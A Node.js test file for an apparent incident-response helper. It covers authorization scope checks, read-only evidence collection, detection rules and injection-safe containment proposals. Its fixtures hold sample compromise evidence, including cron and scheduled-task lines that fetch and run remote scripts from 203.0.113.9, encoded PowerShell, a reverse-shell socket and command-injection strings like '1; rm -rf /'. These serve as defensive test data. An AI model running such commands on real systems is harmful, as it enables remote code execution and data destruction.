// kar-irhelper · ir.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import IR from './ir.mjs';

const { sha256, checkScope, COLLECT, collectionPlan, parseCsv, analyse, propose, safeIp, commandLine, append, verifyLog, MAX_SCOPE_DAYS, BRUTE_FAILURES } = IR;
const NOW = '2026-11-16T12:00:00.000Z';
const scope = (over = {}) => ({ authorizedBy: 'J. Smith, IT director', authorizedAt: '2026-11-16T09:00:00Z', expires: '2026-11-17T09:00:00Z', purpose: 'Suspected compromise of web1', hosts: ['web1', 'WEB2'], ...over });

test('sha256 matches the standard vectors and Node, across block boundaries and UTF-8', () => {
  assert.equal(sha256(''), 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
  assert.equal(sha256('abc'), 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  assert.equal(sha256('abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq'), '248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1');
  for (const s of ['a'.repeat(55), 'a'.repeat(56), 'a'.repeat(63), 'a'.repeat(64), 'a'.repeat(65), 'a'.repeat(1000), 'héllo 🌳 wörld', 'x'.repeat(100000)]) {
    assert.equal(sha256(s), createHash('sha256').update(s, 'utf8').digest('hex'), 'length ' + s.length);
  }
  assert.equal(sha256(7), sha256(''), 'a non-string hashes as empty');
});

test('scope: a complete, current authorization naming this host is accepted', () => {
  const r = checkScope(scope(), 'web1', NOW);
  assert.deepEqual(r.why, []);
  assert.equal(r.ok, true);
  assert.equal(r.summary, 'authorized by J. Smith, IT director at 2026-11-16T09:00:00.000Z for: Suspected compromise of web1 · hosts: web1, WEB2 · until 2026-11-17T09:00:00.000Z');
  assert.equal(checkScope(scope(), 'web2', NOW).ok, true, 'host names match without regard to case');
  assert.equal(checkScope(scope(), ' web1 ', NOW).ok, true);
});

test('scope: every missing or wrong part is a reason to refuse', () => {
  assert.deepEqual(checkScope(null, 'web1', NOW), { ok: false, why: ['the scope must be a JSON object (run: node bin/ir.mjs scope-template)'], summary: '' });
  assert.deepEqual(checkScope({}, 'web1', NOW).why, ['authorizedBy is required: the person who authorized this response', 'purpose is required: why this response is authorized',
    'authorizedAt must be a date and time (ISO 8601)', 'expires must be a date and time (ISO 8601)', 'hosts must list the hosts this authorization covers']);
  assert.deepEqual(checkScope(scope(), 'db1', NOW).why, ['host "db1" is not in this authorization\'s hosts']);
  assert.deepEqual(checkScope(scope(), '', NOW).why, ['the host being examined has no name']);
  assert.deepEqual(checkScope(scope(), 'web1', 'not a time').why, ['the current time could not be read']);
  assert.deepEqual(checkScope(scope({ expires: '2026-11-16T09:00:00Z' }), 'web1', NOW).why, ['expires must be after authorizedAt', 'this authorization has expired']);
  assert.deepEqual(checkScope(scope({ expires: '2026-11-16T12:00:00Z' }), 'web1', NOW).why, ['this authorization has expired'], 'expiry at this very moment has expired');
  assert.equal(checkScope(scope({ expires: '2026-11-16T12:00:01Z' }), 'web1', NOW).ok, true);
  assert.deepEqual(checkScope(scope({ authorizedAt: '2026-11-16T12:00:01Z' }), 'web1', NOW).why, ['authorizedAt is in the future']);
  assert.equal(checkScope(scope({ authorizedAt: NOW }), 'web1', NOW).ok, true, 'authorized this very moment is fine');
  assert.deepEqual(checkScope(scope({ authorizedAt: '2026-11-01T09:00:00Z', expires: '2026-12-01T09:00:01Z' }), 'web1', NOW).why, ['an authorization may last at most 30 days']);
  assert.equal(checkScope(scope({ authorizedAt: '2026-11-01T09:00:00Z', expires: '2026-12-01T09:00:00Z' }), 'web1', NOW).ok, true, 'exactly 30 days is allowed');
  assert.equal(MAX_SCOPE_DAYS, 30);
  assert.deepEqual(checkScope(scope({ hosts: ['', '  ', 7] }), 'web1', NOW).why, ['hosts must list the hosts this authorization covers']);
  assert.deepEqual(checkScope(scope({ hosts: 'web1' }), 'web1', NOW).why, ['hosts must list the hosts this authorization covers']);
  assert.deepEqual(checkScope(scope({ authorizedBy: '  ', purpose: 7 }), 'web1', NOW).why, ['authorizedBy is required: the person who authorized this response', 'purpose is required: why this response is authorized']);
});

test('the allow-list is fixed, read-only, and known per OS', () => {
  assert.equal(collectionPlan('linux'), COLLECT.linux);
  assert.equal(collectionPlan('windows'), COLLECT.windows);
  for (const bad of ['macos', '__proto__', 'toString', '', null, 7]) assert.equal(collectionPlan(bad), null);
  assert.deepEqual(COLLECT.linux.commands.map((c) => c.id), ['processes', 'sockets', 'accounts', 'ssh-log']);
  assert.deepEqual(COLLECT.linux.files.map((c) => c.id), ['cron', 'ssh-keys']);
  assert.deepEqual(COLLECT.windows.commands.map((c) => c.id), ['processes', 'tasks', 'services', 'logons']);
  const all = [...COLLECT.linux.commands, ...COLLECT.windows.commands].map((c) => c.argv.join(' '));
  for (const verb of [/\bkill\b/, /\brm\b/, /Stop-/, /Set-/, /Remove-/, /New-/, /Disable-/, /\/change\b/, /\/delete\b/, /usermod/, /iptables/, /\bsc(\.exe)?\s+(config|stop|delete)/]) {
    for (const c of all) assert.ok(!verb.test(c), 'a collection command must not change anything: ' + c);
  }
  assert.ok(Object.isFrozen(COLLECT) && Object.isFrozen(COLLECT.linux.commands[0].argv) && Object.isFrozen(COLLECT.windows.commands));
});

test('parseCsv: quotes, escaped quotes, CRLF, blank lines and short rows', () => {
  assert.deepEqual(parseCsv('"A","B"\r\n"1,2","say ""hi"""\r\n\r\n"3"\n'), [{ A: '1,2', B: 'say "hi"' }, { A: '3', B: '' }]);
  assert.deepEqual(parseCsv('A,B\nx,y'), [{ A: 'x', B: 'y' }]);
  assert.deepEqual(parseCsv(''), []);
  assert.deepEqual(parseCsv(7), []);
});

const LINUX = {
  os: 'linux', host: 'web1', collectedAt: '2026-11-16T12:00:00Z',
  outputs: {
    processes: ['    1 root     Mon Nov 16 08:00:01 2026 /sbin/init', '  812 www-data Mon Nov 16 10:31:02 2026 /tmp/.x/kworker -c 203.0.113.9:4444', '  999 root     Mon Nov 16 09:00:00 2026 /usr/sbin/sshd -D', 'garbage line'].join('\n'),
    sockets: ['Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process', 'tcp   ESTAB  0      0      10.0.0.5:39012     203.0.113.9:4444  users:(("bash",pid=1337,fd=3))',
      'tcp   LISTEN 0      128    0.0.0.0:22         0.0.0.0:*         users:(("sshd",pid=999,fd=3))', 'tcp   LISTEN 0      5      0.0.0.0:31337      0.0.0.0:*         users:(("nc",pid=1400,fd=3))',
      'tcp   TIME-WAIT 0    0      10.0.0.5:39000     203.0.113.9:80    users:(("sh",pid=1500,fd=3))'].join('\n'),
    accounts: ['root:x:0:0:root:/root:/bin/bash', 'svc:x:0:0::/home/svc:/bin/bash', 'alice:x:1000:1000::/home/alice:/bin/bash', 'short:x:0'].join('\n'),
    'ssh-log': [
      ...Array.from({ length: 5 }, (_, i) => '2026-11-16T10:2' + i + ':00+0000 web1 sshd[2' + i + ']: Failed password for invalid user admin from 203.0.113.9 port 5000' + i + ' ssh2'),
      '2026-11-16T10:29:00+0000 web1 sshd[30]: Accepted password for alice from 203.0.113.9 port 50100 ssh2',
      '2026-11-16T10:40:00+0000 web1 sshd[31]: Accepted password for alice from 203.0.113.9 port 50101 ssh2',
      ...Array.from({ length: 4 }, (_, i) => '2026-11-16T11:0' + i + ':00+0000 web1 sshd[4' + i + ']: Failed password for bob from 198.51.100.7 port 6000' + i + ' ssh2'),
      '2026-11-16T11:09:00+0000 web1 sshd[50]: Accepted publickey for bob from 198.51.100.7 port 60100 ssh2',
    ].join('\n'),
  },
  files: [
    { id: 'cron', path: '/etc/crontab', mtime: '2026-01-01T00:00:00Z', text: '# m h dom mon dow user command\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n*/5 * * * * root curl -s http://203.0.113.9/p | sh\n#*/5 * * * * root /tmp/.x/kworker\n' },
    { id: 'cron', path: '/var/spool/cron/crontabs/www-data', mtime: '2026-11-16T10:35:00Z', text: '@reboot /dev/shm/.k\n*/10 * * * * echo aGk= | base64 -d > /dev/null\n' },
    { id: 'ssh-keys', path: '/home/alice/.ssh/authorized_keys', mtime: '2026-11-16T10:33:00Z', text: 'ssh-ed25519 AAAA attacker' },
    { id: 'ssh-keys', path: '/root/.ssh/authorized_keys', mtime: '2025-06-01T00:00:00Z', text: 'ssh-ed25519 AAAA admin' },
    { id: 'ssh-keys', path: '/home/bob/.ssh/authorized_keys', mtime: '2026-11-09T12:00:00Z', text: 'k' },
    { id: 'ssh-keys', path: '/home/eve/.ssh/authorized_keys', mtime: '2026-11-16T12:00:01Z', text: 'k' },
    'junk',
  ],
};

test('linux: every rule finds what it should, cites where it found it, and nothing more', () => {
  const r = analyse(LINUX);
  assert.equal(r.ok, true);
  const by = (rule) => r.facts.filter((f) => f.rule === rule);
  assert.deepEqual(by('proc-temp').map((f) => [f.detail.pid, f.detail.user, f.line, f.source]), [['812', 'www-data', 2, 'command: processes']]);
  assert.deepEqual(by('shell-socket').map((f) => [f.detail.program, f.detail.pid, f.detail.state, f.line]), [['bash', '1337', 'ESTAB', 2], ['nc', '1400', 'LISTEN', 4]]);
  assert.deepEqual(by('uid0').map((f) => [f.detail.user, f.line]), [['svc', 2]]);
  assert.deepEqual(by('brute-then-success').map((f) => [f.detail.ip, f.detail.user, f.detail.failures, f.line]), [['203.0.113.9', 'alice', 5, 6]], 'four failures is not enough; the first success after five is cited');
  assert.equal(BRUTE_FAILURES, 5);
  assert.deepEqual(by('cron-suspicious').map((f) => [f.detail.path, f.line]), [['/etc/crontab', 3], ['/var/spool/cron/crontabs/www-data', 1], ['/var/spool/cron/crontabs/www-data', 2]], 'a commented-out line is not a job');
  assert.deepEqual(by('keys-recent').map((f) => f.detail.path), ['/home/alice/.ssh/authorized_keys', '/home/bob/.ssh/authorized_keys'], 'exactly 7 days counts; older or in the future does not');
  assert.deepEqual(r.facts.map((f) => f.id), r.facts.map((_, i) => 'F' + (i + 1)));
  assert.equal(r.host, 'web1');
  assert.ok(r.facts.every((f) => f.severity === 'high' || (f.rule === 'keys-recent' && f.severity === 'medium')));
});

const WIN = {
  os: 'windows', host: 'DESK7', collectedAt: '2026-11-16T12:00:00Z',
  outputs: {
    processes: '"ProcessId","Name","ExecutablePath","CommandLine"\r\n"4","System","",""\r\n"6120","svch0st.exe","C:\\Users\\bob\\AppData\\Local\\Temp\\svch0st.exe","svch0st.exe -k"\r\n"700","explorer.exe","C:\\Windows\\explorer.exe","explorer.exe"\r\n"88","x.exe","C:\\Users\\Public\\x.exe",""\r\n',
    tasks: '"HostName","TaskName","Task To Run"\r\n"DESK7","\\Updater","C:\\Program Files\\Upd\\upd.exe -e config.ini"\r\n"DESK7","\\Sync","powershell.exe -nop -w hidden -enc SQBFAFgA"\r\n"DESK7","\\Fetch","powershell -c iwr http://203.0.113.9/a.ps1 | iex"\r\n"DESK7","\\Drop","C:\\Windows\\Temp\\d.exe"\r\n"DESK7","\\Mshta","mshta.exe http://203.0.113.9/x.hta"\r\n"DESK7","\\Rd","rundll32.exe C:\\a.dll,Run http://203.0.113.9/"\r\n"DESK7","TaskName","Task To Run"\r\n',
    services: '"Name","State","StartMode","PathName"\r\n"Spooler","Running","Auto","C:\\Windows\\System32\\spoolsv.exe"\r\n"UpdSvc","Running","Auto","C:\\Users\\bob\\AppData\\Roaming\\u\\svc.exe"\r\n"TmpSvc","Stopped","Manual","C:\\Windows\\Temp\\t.exe"\r\n',
    logons: '"Time","Id","User","Ip"\r\n' + Array.from({ length: 5 }, (_, i) => '"2026-11-16T10:0' + i + ':00Z","4625","Administrator","203.0.113.9"').join('\r\n')
      + '\r\n"2026-11-16T10:09:00Z","4624","Administrator","203.0.113.9"\r\n"2026-11-16T09:00:00Z","4624","bob","-"\r\n"2026-11-16T09:30:00Z","4624","bob",""\r\n',
  },
};

test('windows: every rule finds what it should, and a harmless -e is not encoded PowerShell', () => {
  const r = analyse(WIN);
  assert.equal(r.ok, true);
  const by = (rule) => r.facts.filter((f) => f.rule === rule);
  assert.deepEqual(by('proc-temp').map((f) => [f.detail.pid, f.detail.name, f.line]), [['6120', 'svch0st.exe', 3], ['88', 'x.exe', 5]]);
  assert.deepEqual(by('task-suspicious').map((f) => f.detail.task), ['\\Sync', '\\Fetch', '\\Drop', '\\Mshta', '\\Rd']);
  assert.deepEqual(by('service-temp').map((f) => [f.detail.service, f.detail.startMode]), [['UpdSvc', 'Auto'], ['TmpSvc', 'Manual']]);
  assert.deepEqual(by('brute-then-success').map((f) => [f.detail.ip, f.detail.user, f.detail.failures]), [['203.0.113.9', 'Administrator', 5]]);
  const sorted = analyse({ ...WIN, outputs: { logons: '"Time","Id","User","Ip"\n"2026-11-16T10:09:00Z","4624","a","1.2.3.4"\n' + Array.from({ length: 5 }, (_, i) => '"2026-11-16T10:0' + i + ':00Z","4625","a","1.2.3.4"').join('\n') } });
  assert.equal(sorted.facts.length, 1, 'events are put in time order before counting');
});

test('analyse refuses what it cannot read, and never throws', () => {
  assert.deepEqual(analyse(null), { ok: false, why: 'give an evidence bundle (from: node bin/ir.mjs collect)' });
  assert.deepEqual(analyse({ os: 'macos' }), { ok: false, why: 'unknown os: use "linux" or "windows"' });
  assert.deepEqual(analyse({ os: 'linux' }).facts, []);
  assert.deepEqual(analyse({ os: 'windows', outputs: 7, files: 'x' }).facts, []);
  assert.deepEqual(analyse({ os: 'linux', outputs: { processes: 7 }, files: [{ id: 'ssh-keys', path: '/x', mtime: 'bad' }] }).facts, []);
});

test('proposals: exact commands with their undo, and nothing unsafe ever reaches a command', () => {
  const r = analyse(LINUX);
  const p = Object.fromEntries(r.proposals.map((x) => [x.id, x]));
  const f1 = r.facts.find((f) => f.rule === 'proc-temp').id;
  assert.deepEqual(p[f1 + '.2'].run, ['kill', '-STOP', '812']);
  assert.deepEqual(p[f1 + '.2'].undo, ['kill', '-CONT', '812']);
  assert.equal(p[f1 + '.3'].reversible, false);
  assert.equal(p[f1 + '.1'].kind, 'preserve');
  const bf = r.facts.find((f) => f.rule === 'brute-then-success').id;
  assert.deepEqual(p[bf + '.1'].run, ['iptables', '-I', 'INPUT', '-s', '203.0.113.9', '-j', 'DROP']);
  assert.deepEqual(p[bf + '.2'].undo, ['usermod', '-U', 'alice']);
  const cron = r.facts.find((f) => f.rule === 'cron-suspicious').id;
  assert.deepEqual(p[cron + '.1'].run, ['cp', '-p', '/etc/crontab', '/etc/crontab.ir-evidence']);
  assert.equal(p[cron + '.2'].run, null); assert.equal(p[cron + '.2'].kind, 'check');
  assert.ok(r.proposals.every((x) => Object.isFrozen(x.run) || x.run === null));
  const evil = { id: 'F9', detail: { pid: '1; rm -rf /', ip: '1.2.3.4; reboot', user: 'a"b', path: '/tmp/a$(id)', task: '\\x"; del', service: 'a b' } };
  for (const rule of ['proc-temp', 'shell-socket', 'uid0', 'brute-then-success', 'cron-suspicious', 'keys-recent']) {
    const ps = propose('linux', { ...evil, rule });
    assert.ok(ps.length > 0 && ps.every((x) => x.run === null && x.kind === 'check'), 'linux ' + rule + ' refuses unsafe values');
  }
  for (const rule of ['proc-temp', 'task-suspicious', 'service-temp', 'brute-then-success']) {
    const ps = propose('windows', { ...evil, rule });
    assert.ok(ps.length > 0 && ps.every((x) => x.run === null), 'windows ' + rule + ' refuses unsafe values');
  }
  assert.deepEqual(propose('linux', { id: 'F1', rule: 'nope', detail: {} }), []);
  assert.deepEqual(propose('windows', { id: 'F1', rule: 'uid0', detail: {} }), []);
  assert.deepEqual(propose('linux', null), []);
  assert.deepEqual(propose('linux', { id: 'F1', rule: 'uid0' }), []);
});

test('windows proposals, and the service undo restores its start mode', () => {
  const r = analyse(WIN);
  const p = Object.fromEntries(r.proposals.map((x) => [x.id, x]));
  const svc = r.facts.filter((f) => f.rule === 'service-temp');
  assert.deepEqual(p[svc[0].id + '.1'].undo, ['sc.exe', 'config', 'UpdSvc', 'start=', 'auto']);
  assert.deepEqual(p[svc[1].id + '.1'].undo, ['sc.exe', 'config', 'TmpSvc', 'start=', 'demand']);
  assert.deepEqual(propose('windows', { id: 'F1', rule: 'service-temp', detail: { service: 'S', startMode: 'Disabled' } })[0].undo, ['sc.exe', 'config', 'S', 'start=', 'disabled']);
  assert.deepEqual(propose('windows', { id: 'F1', rule: 'service-temp', detail: { service: 'S', startMode: 'weird' } })[0].undo, ['sc.exe', 'config', 'S', 'start=', 'demand']);
  const task = r.facts.find((f) => f.rule === 'task-suspicious');
  assert.deepEqual(p[task.id + '.1'].run, ['schtasks.exe', '/change', '/tn', '\\Sync', '/disable']);
  const proc = r.facts.find((f) => f.rule === 'proc-temp');
  assert.deepEqual(p[proc.id + '.2'].run, ['taskkill.exe', '/PID', '6120', '/F']);
  assert.deepEqual(p[proc.id + '.1'].run, ['certutil.exe', '-hashfile', 'C:\\Users\\bob\\AppData\\Local\\Temp\\svch0st.exe', 'SHA256']);
  const bf = r.facts.find((f) => f.rule === 'brute-then-success');
  assert.equal(p[bf.id + '.1'].undo[3], "Remove-NetFirewallRule -DisplayName 'IR block 203.0.113.9'");
  assert.equal(p[bf.id + '.1'].run[3], "New-NetFirewallRule -DisplayName 'IR block 203.0.113.9' -Direction Inbound -RemoteAddress 203.0.113.9 -Action Block");
  assert.equal(p[bf.id + '.2'].undo[3], "Enable-LocalUser -Name 'Administrator'");
  assert.ok(p[bf.id + '.2'].run[3] === "Disable-LocalUser -Name 'Administrator'");
  assert.equal(propose('windows', { id: 'F1', rule: 'proc-temp', detail: { pid: 'x', path: '' } })[0].kind, 'check');
  assert.equal(propose('windows', { id: 'F1', rule: 'proc-temp', detail: { pid: '5', path: 'a"b' } })[0].run[0], 'taskkill.exe', 'a safe pid still gets its step when the path is unsafe');
  assert.equal(propose('linux', { id: 'F1', rule: 'brute-then-success', detail: { ip: 'x', user: 'bob' } })[0].run[0], 'usermod');
});

test('safeIp accepts IPv4 only, octets up to 255', () => {
  assert.ok(safeIp('0.0.0.0') && safeIp('255.255.255.255') && safeIp('10.1.2.3'));
  for (const bad of ['256.1.1.1', '1.2.3', '1.2.3.4.5', '::1', 'a.b.c.d', '', null, 7, '1.2.3.4 ']) assert.equal(safeIp(bad), false, String(bad));
});

test('the log chains every entry, and any edit, removal or reordering is found', () => {
  let log = append([], 'scope', { host: 'web1' }, '2026-11-16T12:00:00Z');
  log = append(log, 'collect', { commands: 4 }, '2026-11-16T12:01:00Z');
  log = append(log, 'approve', { proposal: 'F1.2', by: 'J. Smith' }, '2026-11-16T12:05:00Z');
  assert.deepEqual(verifyLog(log), { ok: true, entries: 3, brokenAt: null, anchoredAt: null });
  assert.equal(log[0].prev, 'genesis');
  assert.equal(log[1].prev, log[0].hash);
  assert.equal(log[0].hash, sha256('1|2026-11-16T12:00:00Z|scope|{"host":"web1"}|genesis'));
  const edited = log.map((e) => ({ ...e })); edited[1].data = { commands: 5 };
  assert.deepEqual(verifyLog(edited), { ok: false, entries: 3, brokenAt: 2, anchoredAt: null });
  assert.deepEqual(verifyLog([log[0], log[2]]), { ok: false, entries: 2, brokenAt: 2, anchoredAt: null });
  assert.deepEqual(verifyLog([log[1], log[0], log[2]]), { ok: false, entries: 3, brokenAt: 1, anchoredAt: null });
  const relinked = log.map((e) => ({ ...e })); relinked[2].prev = 'x';
  assert.deepEqual(verifyLog(relinked), { ok: false, entries: 3, brokenAt: 3, anchoredAt: null });
  assert.deepEqual(verifyLog([]), { ok: true, entries: 0, brokenAt: null, anchoredAt: null });
  assert.deepEqual(verifyLog('x'), { ok: false, entries: 0, brokenAt: 0, anchoredAt: null });
  assert.deepEqual(verifyLog([null]), { ok: false, entries: 1, brokenAt: 1, anchoredAt: null });
  const odd = append('nope', 7, undefined, 9);
  assert.deepEqual([odd[0].seq, odd[0].kind, odd[0].data, odd[0].at, odd[0].prev], [1, '', null, '', 'genesis']);
  assert.equal(append([null], 'x', 1, 'y')[1].prev, 'genesis', 'a broken last entry restarts from genesis (and verifyLog fails it)');
});

test('edges the mutation gate found', () => {
  assert.deepEqual(parseCsv('A\nx'), [{ A: 'x' }], 'a last row without a newline is read');
  assert.deepEqual(parseCsv('A\r\nx\r\n'), [{ A: 'x' }]);
  const now = analyse({ os: 'linux', collectedAt: '2026-11-16T12:00:00Z', files: [{ id: 'ssh-keys', path: '/root/.ssh/authorized_keys', mtime: '2026-11-16T12:00:00Z' }] });
  assert.equal(now.facts.length, 1, 'a key file changed at the moment of collection counts as recent');
  const W = (rows) => analyse({ os: 'windows', outputs: { logons: '"Time","Id","User","Ip"\n' + rows.join('\n') } }).facts;
  const fails = Array.from({ length: 5 }, (_, i) => '"2026-11-16T10:1' + i + ':00Z","4625","a","1.2.3.4"');
  assert.deepEqual(W(['"2026-11-16T10:00:00Z","4624","a","1.2.3.4"', ...fails]), [], 'a success before the failures is not a brute force');
  assert.deepEqual(W([...fails.slice(0, 4), '"2026-11-16T10:30:00Z","4624","a","1.2.3.4"']), [], 'four failures is not enough');
  const two = W([...fails, '"2026-11-16T10:30:00Z","4624","first","1.2.3.4"', '"2026-11-16T10:40:00Z","4624","second","1.2.3.4"']);
  assert.deepEqual(two.map((f) => [f.detail.user, f.line]), [['first', 7]], 'only the first success after the failures is cited');
  assert.deepEqual(W([...fails.map((r) => r.replace('1.2.3.4', '-')), '"2026-11-16T10:30:00Z","4624","a","-"']), [], 'a local logon with no address is never a brute force');
  assert.deepEqual(W([...fails.map((r) => r.replace('"1.2.3.4"', '""')), '"2026-11-16T10:30:00Z","4624","a",""']), []);
  assert.deepEqual(W([...fails, '"2026-11-16T10:30:00Z","4634","a","1.2.3.4"']), [], 'only 4624 is a successful logon');
  const cronHand = propose('linux', { id: 'F1', rule: 'cron-suspicious', detail: { path: '/etc/crontab' } })[1];
  const keyHand = propose('linux', { id: 'F2', rule: 'keys-recent', detail: { path: '/root/.ssh/authorized_keys' } })[1];
  assert.equal(cronHand.does, 'Remove or comment out the job after reviewing it');
  assert.equal(keyHand.does, 'Review each key, and remove any you do not recognise');
});

test('a forged log entry with a recomputed hash is still found, by its number or its link', () => {
  let log = append([], 'a', 1, 't1'); log = append(log, 'b', 2, 't2'); log = append(log, 'c', 3, 't3');
  const forge = (e) => ({ ...e, hash: sha256(e.seq + '|' + e.at + '|' + e.kind + '|' + JSON.stringify(e.data) + '|' + e.prev) });
  const wrongSeq = log.slice(); wrongSeq[1] = forge({ ...log[1], seq: 5 });
  assert.equal(verifyLog(wrongSeq).brokenAt, 2, 'a renumbered entry is found even with its hash recomputed');
  const wrongPrev = log.slice(); wrongPrev[1] = forge({ ...log[1], prev: 'f'.repeat(64) });
  assert.equal(verifyLog(wrongPrev).brokenAt, 2, 'an entry relinked to another chain is found even with its hash recomputed');
  const rewritten = log.slice(); rewritten[1] = forge({ ...log[1], data: 99 });
  assert.equal(verifyLog(rewritten).brokenAt, 3, 'rewriting an entry and its hash breaks the link from the next one');
});

test('commandLine: plain arguments as they are, anything else in double quotes', () => {
  assert.equal(commandLine(['kill', '-STOP', '812']), 'kill -STOP 812');
  assert.equal(commandLine(['iptables', '-I', 'INPUT', '-s', '203.0.113.9', '-j', 'DROP']), 'iptables -I INPUT -s 203.0.113.9 -j DROP');
  assert.equal(commandLine(['sc.exe', 'config', 'UpdSvc', 'start=', 'disabled']), 'sc.exe config UpdSvc start= disabled');
  assert.equal(commandLine(['cp', '/a/b_c.d', 'user@host:/x,y+z']), 'cp /a/b_c.d user@host:/x,y+z');
  assert.equal(commandLine(['schtasks.exe', '/tn', '\\Sync']), 'schtasks.exe /tn "\\Sync"');
  assert.equal(commandLine(['powershell.exe', '-Command', "Disable-LocalUser -Name 'a'"]), "powershell.exe -Command \"Disable-LocalUser -Name 'a'\"");
  assert.equal(commandLine(['a*', 'b~', '']), '"a*" "b~" ""');
  assert.equal(commandLine([7]), '7');
  assert.equal(commandLine('kill'), '');
});

test('no value from the evidence can become an option, an expansion or a quote in a command', () => {
  const linux = (rule, detail) => propose('linux', { id: 'F1', rule, detail });
  const win = (rule, detail) => propose('windows', { id: 'F1', rule, detail });
  assert.equal(linux('uid0', { user: '-o' })[0].kind, 'check', 'a name starting with - would be read as an option');
  assert.equal(linux('uid0', { user: 'svc$' })[0].kind, 'check', 'a $ would be expanded by a shell');
  assert.equal(linux('uid0', { user: '_svc' })[0].run[2], '_svc');
  assert.equal(linux('uid0', { user: 'a'.repeat(64) })[0].kind, 'contain');
  assert.equal(linux('uid0', { user: 'a'.repeat(65) })[0].kind, 'check');
  assert.equal(linux('cron-suspicious', { path: 'etc/crontab' })[0].kind, 'check', 'a Linux path must be absolute');
  assert.equal(linux('cron-suspicious', { path: '-rf' })[0].kind, 'check');
  assert.equal(linux('keys-recent', { path: '/home/a\\b/.ssh/authorized_keys' })[0].kind, 'check', 'a backslash is not a Linux path character here');
  for (const bad of ['/tmp/a!b', '/tmp/100%', "/tmp/it's"]) assert.equal(linux('cron-suspicious', { path: bad })[0].kind, 'check', bad);
  assert.equal(linux('cron-suspicious', { path: '/etc/cron.d/my job' })[0].run[2], '/etc/cron.d/my job', 'a space is fine: the argument is quoted');
  assert.equal(win('proc-temp', { pid: 'x', path: 'C:\\Users\\a\\AppData\\Local\\Temp\\%TEMP%.exe' })[0].kind, 'check', 'cmd.exe expands %…% even inside quotes');
  assert.equal(win('brute-then-success', { ip: 'x', user: '-x' })[0].kind, 'check');
  const r = analyse({ os: 'windows', outputs: { processes: '"ProcessId","Name","ExecutablePath"\n"5","a.exe","C:\\Users\\Public\\a b.exe"' } });
  assert.deepEqual(r.proposals[0].run, ['certutil.exe', '-hashfile', 'C:\\Users\\Public\\a b.exe', 'SHA256'], 'a native program: no PowerShell module to fail to load');
  assert.equal(commandLine(r.proposals[0].run), 'certutil.exe -hashfile "C:\\Users\\Public\\a b.exe" SHA256');
  for (const ev of [LINUX, WIN]) for (const p of analyse(ev).proposals) for (const a of [...(p.run || []), ...(p.undo || [])]) assert.ok(!a.includes('"'), 'no argument holds a double quote: ' + a);
});

test('a service: disabled first, then stopped only if it is running', () => {
  const r = analyse(WIN);
  const svc = r.facts.filter((f) => f.rule === 'service-temp');
  assert.deepEqual(svc.map((f) => f.detail.state), ['Running', 'Stopped']);
  const steps = (f) => r.proposals.filter((p) => p.fact === f.id);
  assert.deepEqual(steps(svc[0]).map((p) => [p.run, p.undo]), [[['sc.exe', 'config', 'UpdSvc', 'start=', 'disabled'], ['sc.exe', 'config', 'UpdSvc', 'start=', 'auto']], [['sc.exe', 'stop', 'UpdSvc'], ['sc.exe', 'start', 'UpdSvc']]]);
  assert.deepEqual(steps(svc[1]).map((p) => p.id), [svc[1].id + '.1'], 'a stopped service is not stopped again');
  assert.equal(steps(svc[0])[1].id, svc[0].id + '.2');
});

test('the anchor: a recorded hash catches a rewrite of the whole chain', () => {
  let log = append([], 'scope', 1, 't1'); log = append(log, 'collect', 2, 't2');
  const anchor = log[1].hash;
  log = append(log, 'approve', 3, 't3');
  assert.deepEqual(verifyLog(log, anchor), { ok: true, entries: 3, brokenAt: null, anchoredAt: 2 });
  assert.deepEqual(verifyLog(log, log[2].hash), { ok: true, entries: 3, brokenAt: null, anchoredAt: 3 });
  let rewritten = append([], 'scope', 1, 't1'); rewritten = append(rewritten, 'collect', 99, 't2'); rewritten = append(rewritten, 'approve', 3, 't3');
  assert.deepEqual(verifyLog(rewritten), { ok: true, entries: 3, brokenAt: null, anchoredAt: null }, 'without the anchor a full rewrite passes');
  assert.deepEqual(verifyLog(rewritten, anchor), { ok: false, entries: 3, brokenAt: null, anchoredAt: null }, 'with it, it does not');
  assert.deepEqual(verifyLog(log, '  '), { ok: true, entries: 3, brokenAt: null, anchoredAt: null }, 'a blank anchor is no anchor');
  assert.deepEqual(verifyLog(log, 7), { ok: true, entries: 3, brokenAt: null, anchoredAt: null });
  const broken = log.map((e) => ({ ...e })); broken[0].data = 0;
  assert.deepEqual(verifyLog(broken, anchor), { ok: false, entries: 3, brokenAt: 1, anchoredAt: null });
});
